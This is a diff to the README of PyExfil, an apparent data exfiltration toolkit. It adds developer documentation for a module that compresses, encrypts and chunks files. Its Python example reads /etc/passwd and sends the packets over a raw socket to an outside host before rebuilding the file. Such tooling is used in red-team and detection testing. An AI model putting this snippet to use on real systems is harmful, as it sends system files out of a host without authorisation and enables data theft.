@@ -338,6 +338,37 @@ DecodeExfiltrationFile(originalImage="base_"+originalImage, newImage="niceImage.
 
 ```
 
+## Developers' Documentation
+
+Please notice that although we have tried to keep this a collection of relatively separated stand alone modules so that converting them to static binaries for various operating systems would be as easy as possible, some things we have decided to turn into modules that would be shared across the board while attempting to keep is as depency free as possible. Such a component for now is `pyexfil/includes/prepare`. This module contains the methos of converting files (compressing, encrypting, encoding and splitting) into chunks ready to be sent or decoded.
+
+You can use it in the following way:
+
+```python
+from pyexfil.includes.prepare import PrepFile, RebuildFile, DecodePacket
+
+proc = PrepFile('/etc/passwd', kind='binary') # will yield a dictionary
+
+# Send the data over
+sock = socket.socket()
+sock.connect(('google.com', 443))
+for i in proc['Packets']:
+    sock.send(i)
+sock.close()
+
+# Rebuilding the data:
+conjoint = []
+for packet in proc['Packets']:
+    b = DecodePacket(packet)
+    conjoint.append(b)
+
+# Verify and rebuild the file:
+print RebuildFile(conjoint)
+
+
+```
+
+
 ## Future Stuff
 ### Version Alpha
 - [X] Check why HTTP Cookie exfiltration keeps failing CRC checks. (Fixed in patch #7 by Sheksa)
